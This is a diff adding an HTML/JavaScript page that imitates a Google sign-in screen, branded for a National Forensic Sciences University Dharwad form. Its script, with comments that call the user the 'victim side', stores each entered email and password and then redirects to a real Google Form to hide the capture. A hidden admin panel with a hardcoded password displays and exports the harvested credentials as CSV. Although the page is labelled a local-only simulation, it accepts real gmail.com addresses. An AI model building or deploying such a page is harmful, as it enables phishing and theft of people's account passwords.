@@ -1,0 +1,305 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>NFSU Simulation — Local-only Collector</title>
+<style>
+  /* Google-signin-inspired but original styles */
+  @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
+
+  :root{
+    --bg: #f1f3f4;
+    --card-bg: #ffffff;
+    --text: #202124;
+    --muted: #5f6368;
+    --primary: #1a73e8;
+    --danger: #d93025;
+    --surface-border: rgba(60,64,67,0.08);
+  }
+
+  html,body{height:100%;}
+  body { font-family: 'Roboto', Arial, sans-serif; background:var(--bg); margin:0; padding:40px; color:var(--text); -webkit-font-smoothing:antialiased; }
+  .wrap { max-width:420px; margin:64px auto; }
+
+  .card { background:var(--card-bg); padding:28px; border-radius:12px; box-shadow:0 6px 18px rgba(60,64,67,0.12); border:1px solid var(--surface-border); }
+  h2{ margin:0 0 12px 0; font-weight:500; font-size:20px; color:var(--text); text-align:center; }
+  /* center the initial note beneath the title to mimic Google sign-in layout */
+  .card > .note:first-of-type { text-align:center; margin:12px 0 12px 0; }
+  .row { display:flex; gap:8px; }
+
+  /* Form margins: centered within card */
+  form#simForm { margin:12px 0 12px 0; }
+
+  /* Header row with logos — use grid so heading stays centered while logos sit to the edges */
+  .header-row { display:grid; grid-template-columns:auto 1fr auto; align-items:center; width:100%; padding:0; }
+  .header-text { display:block; text-align:center; padding:0 6px; }
+  .logo { width:72px; height:72px; display:block; object-fit:contain; box-sizing:border-box; }
+  /* Use equal padding on both sides; remove negative margins so logos are symmetric */
+  .logo.left {
+    justify-self:start; margin-left:0;
+    padding:4px; border-radius:50%; background:linear-gradient(180deg, rgba(255,255,255,0.94), rgba(241,243,244,0.8));
+    box-shadow:0 6px 18px rgba(60,64,67,0.08); border:1px solid rgba(0,0,0,0.04);
+    object-fit:contain;
+    /* nudge upwards to align with heading text */
+    transform: translateY(-10px);
+  }
+  /* keep right logo neat and constrained and match left logo padding for symmetry */
+  .logo.right {
+    justify-self:end; margin-right:0; padding:4px; max-width:120px; width:72px; height:72px; border-radius:8px; transform: translateY(-10px); object-fit:contain;
+  }
+  @media (max-width:420px){
+    .logo{ width:56px; height:56px }
+    .logo.left{ margin-left:0; padding:3px; transform: translateY(-6px); }
+    .logo.right{ margin-right:0; max-width:88px; width:56px; height:56px; padding:3px; transform: translateY(-6px); }
+  }
+
+  input[type=text], input[type=password] {
+    width:100%; padding:12px 14px; margin:12px 0; border-radius:8px; border:1px solid #e0e0e0; background:#fff; box-shadow:inset 0 1px 0 rgba(60,64,67,0.03); font-size:14px; transition:box-shadow .12s, border-color .12s; box-sizing:border-box;
+  }
+  input[type=text]:focus, input[type=password]:focus{ outline:none; border-color: rgba(26,115,232,0.6); box-shadow:0 0 0 4px rgba(26,115,232,0.06); }
+
+  button { padding:10px 14px; border-radius:8px; border:none; cursor:pointer; font-weight:500; font-size:14px; }
+  .primary { background:var(--primary); color:#fff; box-shadow:0 2px 6px rgba(26,115,232,0.18); }
+  .muted { background:transparent; color:var(--muted); border:1px solid transparent; }
+  .muted:hover{ background:rgba(60,64,67,0.04); }
+
+  .note { font-size:13px; color:var(--muted); margin:6px 0; }
+  table { width:100%; border-collapse:collapse; margin-top:12px; }
+  th,td { border:1px solid #f1f3f4; padding:10px; font-size:13px; text-align:left; }
+  .admin-area { margin:12px 0 12px 0; display:none; }
+  .danger { background:var(--danger); color:white; }
+  .small { font-size:14px; color:var(--muted); margin:12px 0 6px 0; display:block; font-weight:500; }
+
+  /* Form action buttons alignment: match input inner padding so edges line up */
+  .form-actions { display:flex; gap:8px; margin:12px 0 0 0; padding:0 0; }
+  .form-actions button { flex:1; }
+  @media (max-width:420px){ .form-actions { padding:0; } }
+
+  /* Floating admin toggle — slightly elevated */
+  #adminToggle.muted{ background:#fff; border:1px solid var(--surface-border); box-shadow:0 6px 18px rgba(60,64,67,0.12); }
+
+  @media (max-width:480px){
+    body{padding:20px}
+    .wrap{margin:28px auto}
+    .card{padding:18px}
+  }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <div class="header-row">
+        <img class="logo left" src="assets/logoo.png" alt="left logo" width="72" height="72">
+        <div class="header-text">
+          <h2>Google Sign in</h2>
+          <p class="note">To Access <strong>NFSU Dharward Form</strong></p>
+        </div>
+        <img class="logo right" src="assets/National_Forensic_Sciences_University_Logo.png" alt="right logo" width="72" height="72">
+      </div>
+
+      <form id="simForm" autocomplete="off" aria-labelledby="title">
+        <label class="small">Email</label>
+        <input id="uid" name="uid" type="text" placeholder="example@gmail.com" required>
+
+        <label class="small">Password</label>
+        <input id="pwd" name="pwd" type="password" placeholder="password" required>
+
+        <div class="form-actions">
+          <button class="primary" type="submit">Continue</button>
+        </div>
+      </form>
+
+      
+      <hr>
+
+      <div id="adminContainer" style="display:none;">
+        <div>
+          <label class="small">Admin access</label>
+          <div style="display:flex; gap:8px; align-items:center;">
+            <input id="adminPass" type="password" placeholder="Enter admin password">
+            <button id="unlockAdmin" class="muted">Unlock Admin</button>
+          </div>
+          <p class="note">Admin password is checked client-side for demo convenience. Use only in lab and change password below if needed.</p>
+        </div>
+
+        <div id="adminArea" class="admin-area card" style="padding:12px; display:none;">
+        <h3>Admin — Submissions</h3>
+        <div style="display:flex; gap:8px; flex-wrap:wrap; align-items:center;">
+          <button id="refresh" class="muted">Refresh</button>
+          <button id="exportCsv" class="muted">Export CSV</button>
+          <button id="clearData" class="danger">Clear All</button>
+          <span class="note">Data is stored under localStorage key <code>nfsu_sim_local</code>.</span>
+        </div>
+
+        <div id="logWrap" style="overflow:auto; margin-top:10px;">
+          <table id="logTable" aria-live="polite">
+            <thead><tr><th>#</th><th>Timestamp (ISO)</th><th>Email</th><th>Password (test)</th></tr></thead>
+            <tbody></tbody>
+          </table>
+        </div>
+        </div>
+
+      </div>
+  </div>
+
+<script>
+/* -------------------------
+   Configuration (edit as required)
+   ------------------------- */
+const STORAGE_KEY = 'nfsu_sim_local'; // where submissions are saved
+const ADMIN_PASSWORD = 'nfsu-admin-2025'; // change this before demo if you like
+const ALLOWED_EMAIL_DOMAINS = ['gmail.com','example.local','nfsu.lab']; // only these allowed
+
+/* -------------------------
+   Utility functions
+   ------------------------- */
+function getStored(){
+  try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]'); }
+  catch(e){ return []; }
+}
+function setStored(arr){
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(arr));
+}
+function addRecord(rec){
+  const arr = getStored();
+  arr.push(rec);
+  setStored(arr);
+}
+function isAllowedEmail(email){
+  const m = email.trim().toLowerCase().match(/@([^@\s]+)$/);
+  if(!m) return false;
+  return ALLOWED_EMAIL_DOMAINS.includes(m[1]);
+}
+function formatISO(d){ return (new Date(d)).toISOString(); }
+
+/* -------------------------
+   Form submission (victim side)
+   ------------------------- */
+document.getElementById('simForm').addEventListener('submit', function(e){
+  e.preventDefault();
+  const uid = document.getElementById('uid').value.trim();
+  const pwd = document.getElementById('pwd').value;
+
+  if(!isAllowedEmail(uid)){
+    alert('Please use a test email such as student@gmail.com or user@example.local');
+    return;
+  }
+
+  // Save locally (device that opened the page)
+  const rec = { ts: new Date().toISOString(), uid, pwd };
+  addRecord(rec);
+
+  // Redirect to a different website
+  window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSdgCGVMTVuLq4dfFIT2Dkru7zRWqjVMoxBJ2ctUKpCD6groXw/viewform?usp=publish-editor';
+});
+
+/* -------------------------
+   Admin unlock & UI
+   ------------------------- */
+const adminArea = document.getElementById('adminArea');
+document.getElementById('unlockAdmin').addEventListener('click', function(){
+  const pass = document.getElementById('adminPass').value;
+  if(pass === ADMIN_PASSWORD){
+    adminArea.style.display = 'block';
+    refreshTable();
+    document.getElementById('adminPass').value = '';
+    alert('Admin unlocked — you can view and export submissions.');
+  } else {
+    alert('Wrong admin password.');
+  }
+});
+
+/* -------------------------
+   Table / Export / Clear
+   ------------------------- */
+function refreshTable(){
+  const rows = getStored();
+  const tbody = document.querySelector('#logTable tbody');
+  tbody.innerHTML = '';
+  rows.forEach((r,i)=>{
+    const tr = document.createElement('tr');
+    tr.innerHTML = `<td>${i+1}</td><td>${r.ts}</td><td>${escapeHtml(r.uid)}</td><td>${escapeHtml(r.pwd)}</td>`;
+    tbody.appendChild(tr);
+  });
+}
+
+document.getElementById('refresh').addEventListener('click', refreshTable);
+
+function downloadCSV(filename, rows){
+  if(!rows.length){ alert('No data to export'); return; }
+  const headers = ['ts','uid','pwd'];
+  const csv = [headers.join(',')].concat(rows.map(r => headers.map(h => `"${(r[h]||'').toString().replace(/"/g,'""')}"`).join(','))).join('\n');
+  const blob = new Blob([csv], {type:'text/csv'});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a'); a.href = url; a.download = filename; document.body.appendChild(a);
+  a.click(); a.remove(); URL.revokeObjectURL(url);
+}
+
+document.getElementById('exportCsv').addEventListener('click', ()=>{
+  const rows = getStored();
+  downloadCSV('nfsu_sim_submissions.csv', rows);
+});
+
+document.getElementById('clearData').addEventListener('click', ()=>{
+  if(!confirm('Clear all stored simulation data from this device?')) return;
+  localStorage.removeItem(STORAGE_KEY);
+  refreshTable();
+  alert('Cleared.');
+});
+
+/* -------------------------
+   Helpers
+   ------------------------- */
+function escapeHtml(s){
+  return (s||'').toString().replace(/[&<>"']/g, function(m){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]; });
+}
+
+// optional: fake cancel button to mimic real site behavior
+const fakeCancelBtn = document.getElementById('fakeCancel');
+if(fakeCancelBtn) {
+  fakeCancelBtn.addEventListener('click', ()=>{
+    document.getElementById('simForm').reset();
+  });
+}
+
+// Ensure admin area and container are hidden on load
+const adminContainer = document.getElementById('adminContainer');
+if(adminContainer) adminContainer.style.display = 'none';
+if(typeof adminArea !== 'undefined' && adminArea) adminArea.style.display = 'none';
+
+// Create floating Admin button at bottom-right with high visibility
+const adminToggle = document.createElement('button');
+adminToggle.id = 'adminToggle';
+adminToggle.className = 'muted';
+adminToggle.textContent = 'Admin';
+Object.assign(adminToggle.style, {
+  position: 'fixed',
+  right: '20px',
+  bottom: '20px',
+  zIndex: '1000',
+  padding: '8px 12px',
+  borderRadius: '6px',
+  cursor: 'pointer',
+  fontSize: '12px',
+  fontWeight: '500',
+  background: '#ffffff',
+  color: '#000000',
+  border: '1px solid #e0e0e0'
+});
+document.body.appendChild(adminToggle);
+
+adminToggle.addEventListener('click', ()=> {
+  if(!adminContainer) return;
+  if(adminContainer.style.display === 'none' || adminContainer.style.display === '') {
+    adminContainer.style.display = 'block';
+    adminToggle.textContent = 'Close Admin';
+    adminContainer.scrollIntoView({behavior:'smooth', block:'center'});
+  } else {
+    adminContainer.style.display = 'none';
+    adminToggle.textContent = 'Admin';
+  }
+});
+</script>
+</body>
+</html>
